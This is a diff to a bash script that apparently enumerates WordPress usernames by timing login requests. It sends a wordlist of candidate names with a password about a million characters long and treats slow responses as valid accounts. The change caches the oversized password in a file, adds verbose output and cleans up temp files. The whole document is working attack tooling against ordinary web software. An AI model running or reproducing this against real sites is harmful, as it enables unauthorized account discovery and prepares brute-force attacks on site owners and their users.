@@ -20,13 +20,16 @@ if [ "$2" == "-v" ]; then
 	verbose=true
 fi
 
+printf "%s" {1..1000000} > tmpLongPassword
+
 while read -r line; do
 	if $verbose; then
 		echo "Testing: $line"
 		echo "Generate Payload"
 	fi
 	echo -n "log=$line&pwd=" > tmpPayload
-	printf "%s" {1..1000000} >> tmpPayload
+	#printf "%s" {1..1000000} >> tmpPayload
+	cat tmpLongPassword >> tmpPayload
 	echo -n "&wp-submit=Log In&testcookie=1" >> tmpPayload
 	if $verbose; then
 		echo "Payload generated"
@@ -38,5 +41,11 @@ while read -r line; do
 
 	if (( $(bc <<< "$result >= 30") )); then
 		echo "USERNAME FOUND: $line"
+	else
+		if $verbose; then
+			echo "attack finished with no result"
+		fi
 	fi
 done
+rm tmpPayload
+rm tmpLongPassword
